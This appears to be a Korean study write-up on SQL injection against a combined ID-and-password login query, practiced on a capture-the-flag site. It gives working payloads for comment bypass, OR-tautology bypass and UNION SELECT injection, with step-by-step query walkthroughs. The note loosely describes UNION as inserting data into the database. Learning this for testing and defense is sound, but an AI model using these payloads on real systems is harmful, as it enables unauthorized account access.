# 식별 & 인증 동시(SQL Injection)

SQL Injection 기법 중에서 식별과 인증을 동시에 처리하는 케이스.

하단의 query문과 메커니즘을 사용한다는 것을 가정하고 진행하는 해킹 기법이다.

ex)
```
select * from member where id='' and pass=''
```
```
if( query 의 결과가 존재(TRUE)한다면 ){
    로그인 성공
}else{
    로그인 실패
}
``` 
and 논리 연산자를 사용해서 ID의 여부와 password가 정확한지 동시에 인증을 하는 것이다.
</br>
</br>
</br>


http://ctf.segfaulthub.com:1019/   
이 링크는 SQL Injection 기법을 테스트해볼 수 있는 사이트이다.
</br>
</br>
</br>

로그인을 진행할 때   
서버측에서 준비한 sql 쿼리문이 and 를 사용했다고 가정하고   
```
select * from member where id='' and pass=''
```
</br>

아이디와 비밀번호를 입력한다면 
```
id : normaltic / pw : qqqq   
```
</br>

id와 pw 값을 '' '' 사이에 넣어서 검색한다.
```
select * from member where id='normaltic' and pass='qqqq'
```
</br>
</br>

우리는 and 를 사용해서 query문을 작성했다는 것을 가정하고 진행하기에   
SQL Injection 에 대해서 여러 가지 방법을 생각해볼 수 있다.
</br>
</br>
</br>

# \# (주석)
아이디에 주석처리할 수 있는 문구를 넣어 인증을 우회하는 방식.

id : mario'# 입력한다면
```
id : mario'#
pw : qqqq
```

```
select * from member where id='mario'#' and pass='qqqq'   
```
→
```php
select * from member where id='mario'#' and pass='qqqq'
```
이와같이 # 뒷부분은 주석처리가 되는 것을 알 수 있다.

주석처리 된 부분 
```py
#' and pass='qqqq'
```
비밀번호를 검증할 수 있는 구문이 사라진다.
</br>
</br>

그렇기에
```
select * from member where id='mario'
```
까지만 실행되므로   
![1](https://user-images.githubusercontent.com/106296883/232513782-2f086dcf-7ffa-41e4-a776-2aa1bc158318.PNG)

mario에 관한 정보를 확인할 수 있다.

위 mario의 정보를 받아 밑의 인증 구문을 우회할 수 있다.
```
if( 그 결과가 존재하면 ){
    로그인 성공
}else{
    로그인 실패
}
```
결과가 존재하기에 로그인을 성공시킬 수 있다.

![2](https://user-images.githubusercontent.com/106296883/232516701-2a7803a8-05a9-4d10-9280-41e45df8077d.PNG)

</br>
</br>
</br>

# or (논리 연산자)

or 논리 연산자를 id 입력칸에 넣어 논리 연산자의 우선순위를 이용해 공격하는 방식이다. 
</br>
</br>

or 와 and 의 연산 우선순위를 먼저 알아야 한다.    
## 동작하는 과정 
```
and → or 

and 연산자가 우선적으로 처리를 하고,
or 연산자가 그 뒤에 처리된다.
```
</br>
</br>
</br>

아이디에 mario'or'1'='1'# 라고 입력을 한다면 
```
id : mario'or'1'='1
pw : 321qweq
```
```
select * from member where id='mario'or'1'='1' and pass='321qweq'
```
→
```
select * from member where id='mario'or('1'='1' and pass='321qweq')
```
</br>

## and 우선 수행 (and 는 둘 다 TRUE 여야 TRUE 를 반환한다.)   
('1'='1' and pass='321qweq') 부분이 먼저 수행이 된다.
```
('1'='1' and pass='321qweq')


위 부분은 
'1'='1' 부분은 TRUE 이지만,
password='321qweq' 의 인증이 FALSE 이기 때문에 
FALSE 가 된다.
```
</br>

## or 수행 (or 은 둘 중에 하나만 TRUE 여도 TRUE 를 반환한다.)
```
select * from member where id='mario' or (FALSE)

select * from member where id='mario' = TRUE (정보가 존재하기 때문에)
TRUE or (FALSE) = TRUE
```

```
if( query 의 결과가 존재(TRUE)한다면 ){
    로그인 성공
}else{
    로그인 실패
}
```
결과가 존재하기에 로그인을 성공시킬 수 있다.
</br>
</br>

# or,  \#  결합 
```
id : mario'or'1'='1'#
```
이처럼 or 과 # 을 결합시켜 적용시킬 수도 있다.
</br>
</br>
</br>

# union
query 문에 union 을 추가하여 임시로 database 에 내가 원하는 정보를 넣는 것이다.

union 은 select 문을 2개 사용할 수 있게 하여 데이터를 연결해서 출력할 수 있도록 한다.
```
select ~~~~~ union select ~~~~~
```
</br>
</br></br>

## \#
우선 id 와 pw 를 입력해보겠다.
```
id : mario' union select 1,2,3,4 #
pw : 1234
```
</br>

아이디를 위와같이 입력한다면 서버에서 처리되는 query 문은 다음과 같다.
```
select * from member where id='mario' union select 1,2,3,4 #' and pass='1234'
```
</br>

주석처리를 통해 이 부분은 처리되지 않는다.
```py
#' and pass='1234'
```

나머지 부분을 처리하게 된다면 결과는 mario 정보와 colum 마다 새롭게 넣은 정보가 들어간다.
```
select * from member where id='mario' union select 1,2,3,4
```
![3](https://user-images.githubusercontent.com/106296883/232667545-2b4c951d-0b0c-4d17-9ad4-b8e99546a959.PNG)



결국 union 을 제대로 활용하려면 table 의 colum 의 개수를 정확하게 알아야 한다.

1,2,3,4 가 아니라 1,2,3 을 넣게 된다면 오류가 발생하여 새로운 정보가 주입되지 않는다.
</br>
</br>
</br>

## ' union select 1,2,3,4
```
id : ' union select 1,2,3,4
pw : 1234
```
![4](https://user-images.githubusercontent.com/106296883/232678556-f33f621c-325a-4b6d-b917-542855d97431.PNG)
이런 식으로 mario 에 대한 정보 없이, 내가 주입한 데이터가 제일 상단으로 올라오게 할 수 있다.
</br>
</br>
</br>

## or (사용불가)

```
id : mario' union select 1,2,3,4 or'1'='1
pw : 1234
```
↓
```
select * from member where id='mario' union select 1,2,3,4 or'1'='1' and pass='1234'
```
↓
```
'1'='1' and pass='1234'

FALSE
```
↓
```
union select 1,2,3,4 or FALSE 

TRUE
```
이런 메커니즘으로 동작이 될 것 같지만 union select 1,2,3,4 가 or 때문에 제대로 동작하지 않아 database 에 정보를 주입할 수 없다.

그러므로 union 에서는 or 사용이 불가.